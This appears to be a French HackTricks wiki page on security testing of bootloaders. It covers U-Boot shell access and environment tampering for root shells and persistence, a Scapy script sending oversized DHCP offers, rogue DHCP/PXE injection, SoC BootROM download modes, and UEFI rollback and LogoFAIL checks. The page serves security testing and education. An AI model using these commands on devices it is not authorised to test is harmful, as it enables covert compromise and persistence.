# Test des bootloaders

{{#include ../../banners/hacktricks-training.md}}

Les étapes suivantes sont recommandées pour modifier les configurations de démarrage des appareils et tester des bootloaders tels que U-Boot et les chargeurs de type UEFI. Concentrez-vous sur l'obtention d'une exécution de code très tôt, l'évaluation des protections de signature/rollback, et l'abus des chemins de récupération ou de netboot.

## U-Boot : astuces rapides et abus de l'environnement

1. Accéder à l'interpréteur
- Pendant le démarrage, appuyez sur une touche de break connue (souvent n'importe quelle touche, 0, espace, ou une séquence "magique" spécifique à la carte) avant que `bootcmd` ne s'exécute pour tomber sur l'invite U-Boot.

2. Inspecter l'état de démarrage et les variables
- Commandes utiles :
- `printenv` (dump de l'environnement)
- `bdinfo` (info carte, adresses mémoire)
- `help bootm; help booti; help bootz` (méthodes de boot du kernel supportées)
- `help ext4load; help fatload; help tftpboot` (chargeurs disponibles)

3. Modifier les arguments de boot pour obtenir un root shell
- Ajoutez `init=/bin/sh` pour que le kernel tombe sur un shell au lieu de l'init normal :
```
# printenv
# setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
# saveenv
# boot    # or: run bootcmd
```

4. Netboot depuis votre serveur TFTP
- Configurez le réseau et récupérez un kernel/fit image depuis le LAN :
```
# setenv ipaddr 192.168.2.2      # device IP
# setenv serverip 192.168.2.1    # TFTP server IP
# saveenv; reset
# ping ${serverip}
# tftpboot ${loadaddr} zImage           # kernel
# tftpboot ${fdt_addr_r} devicetree.dtb # DTB
# setenv bootargs "${bootargs} init=/bin/sh"
# booti ${loadaddr} - ${fdt_addr_r}
```

5. Persister les changements via l'environnement
- Si le stockage d'env n'est pas protégé en écriture, vous pouvez persister le contrôle :
```
# setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
# saveenv
```
- Vérifiez des variables comme `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets` qui influencent les chemins de repli. Des valeurs mal configurées peuvent permettre de revenir plusieurs fois dans le shell.

6. Vérifier les fonctionnalités de debug/unsafe
- Recherchez : `bootdelay` > 0, `autoboot` désactivé, `usb start; fatload usb 0:1 ...` non restreint, possibilité de `loady`/`loads` via la série, `env import` depuis des médias non fiables, et des kernels/ramdisks chargés sans vérification de signature.

7. Test d'images U-Boot/vérification
- Si la plateforme prétend avoir un secure/verified boot avec des images FIT, essayez des images non signées et altérées :
```
# tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
# tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
# tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
```
- L'absence de `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` ou le comportement legacy `verify=n` permet souvent de booter des payloads arbitraires.

## Surface de net-boot (DHCP/PXE) et serveurs rogue

8. Fuzzing des paramètres PXE/DHCP
- La gestion legacy BOOTP/DHCP de U-Boot a eu des problèmes de sécurité mémoire. Par exemple, CVE‑2024‑42040 décrit une divulgation de mémoire via des réponses DHCP craftées qui peuvent leak des octets de la mémoire U-Boot sur le réseau. Exercez les chemins de code DHCP/PXE avec des valeurs excessivement longues/cases limites (option 67 bootfile-name, vendor options, champs file/servername) et observez les hangs/leaks.
- Extrait Scapy minimal pour stresser les paramètres de boot pendant le netboot :
```python
from scapy.all import *
offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
IP(src='192.168.2.1', dst='255.255.255.255')/
UDP(sport=67, dport=68)/
BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
DHCP(options=[('message-type','offer'),
('server_id','192.168.2.1'),
# Intentionally oversized and strange values
('bootfile_name','A'*300),
('vendor_class_id','B'*240),
'end']))
sendp(offer, iface='eth0', loop=1, inter=0.2)
```
- Validez également si les champs de nom de fichier PXE sont passés à des scripts/logiciels du loader sans sanitation lorsqu'ils sont chaînés à des scripts de provisioning côté OS.

9. Test d'injection de commande via un DHCP rogue
- Montez un service DHCP/PXE rogue et tentez d'injecter des caractères dans les champs filename ou options pour atteindre des interpréteurs de commandes dans les étapes ultérieures de la chaîne de boot. L'auxiliaire DHCP de Metasploit, `dnsmasq`, ou des scripts Scapy custom fonctionnent bien. Assurez-vous d'isoler le réseau de laboratoire en premier.

## Modes de recovery BootROM SoC qui outrepassent le boot normal

Beaucoup de SoCs exposent un mode BootROM "loader" qui acceptera du code via USB/UART même lorsque les images flash sont invalides. Si les fusibles secure-boot ne sont pas grillés, cela peut fournir une exécution de code arbitraire très tôt dans la chaîne.

- NXP i.MX (Serial Download Mode)
- Outils: `uuu` (mfgtools3) ou `imx-usb-loader`.
- Exemple: `imx-usb-loader u-boot.imx` pour pousser et exécuter un U-Boot custom depuis la RAM.
- Allwinner (FEL)
- Outil: `sunxi-fel`.
- Exemple: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` ou `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
- Outil: `rkdeveloptool`.
- Exemple: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` pour préparer un loader et uploader un U-Boot custom.

Évaluez si l'appareil a des eFuses/OTP de secure-boot brûlés. Sinon, les modes de download BootROM permettent fréquemment de bypasser toute vérification de niveau supérieur (U-Boot, kernel, rootfs) en exécutant votre payload de premier stade directement depuis SRAM/DRAM.

## Bootloaders UEFI/PC-class : vérifications rapides

10. Altération de l'ESP et tests de rollback
- Montez la partition EFI System Partition (ESP) et vérifiez les composants du loader : `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, chemins de logo vendor.
- Essayez de booter avec des composants signés downgradés ou connus vulnérables si les révocations Secure Boot (dbx) ne sont pas à jour. Si la plateforme fait encore confiance à d'anciens shims/bootmanagers, vous pouvez souvent charger votre propre kernel ou `grub.cfg` depuis l'ESP pour obtenir de la persistance.

11. Bugs d'analyse de logo de boot (classe LogoFAIL)
- Plusieurs firmwares OEM/IBV étaient vulnérables à des failles d'analyse d'image dans les DXE qui traitent les logos de boot. Si un attaquant peut placer une image craftée sur l'ESP sous un chemin spécifique au vendor (par ex., `\EFI\<vendor>\logo\*.bmp`) et redémarrer, une exécution de code pendant le early boot peut être possible même avec Secure Boot activé. Testez si la plateforme accepte des logos fournis par l'utilisateur et si ces chemins sont modifiables depuis l'OS.

## Précautions matérielles

Soyez prudent lorsque vous manipulez de la flash SPI/NAND pendant le early boot (par ex., mettre à la masse des broches pour bypasser des lectures) et consultez toujours la datasheet de la flash. Des courts-circuits mal synchronisés peuvent corrompre l'appareil ou le programmateur.

## Notes et conseils additionnels

- Essayez `env export -t ${loadaddr}` et `env import -t ${loadaddr}` pour déplacer des blobs d'environnement entre RAM et stockage ; certaines plateformes permettent d'importer l'env depuis des médias amovibles sans authentification.
- Pour la persistance sur des systèmes Linux qui bootent via `extlinux.conf`, modifier la ligne `APPEND` (pour injecter `init=/bin/sh` ou `rd.break`) sur la partition de boot suffit souvent quand aucune vérification de signature n'est appliquée.
- Si l'espace utilisateur fournit `fw_printenv/fw_setenv`, vérifiez que `/etc/fw_env.config` correspond au vrai stockage d'env. Des offsets mal configurés vous permettent de lire/écrire la mauvaise région MTD.

## Références

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [https://nvd.nist.gov/vuln/detail/CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)

{{#include ../../banners/hacktricks-training.md}}
